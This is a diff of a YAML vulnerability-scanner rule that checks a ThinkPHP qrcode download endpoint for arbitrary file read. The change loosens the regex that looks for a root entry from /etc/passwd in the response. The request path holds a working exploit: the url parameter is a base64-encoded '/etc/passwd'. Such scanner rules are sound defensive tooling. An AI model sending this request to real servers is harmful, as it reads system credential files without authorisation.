@@ -12,7 +12,7 @@ rules:
         request:
             method: GET
             path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
-        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
     Windows0:
         request:
             method: GET
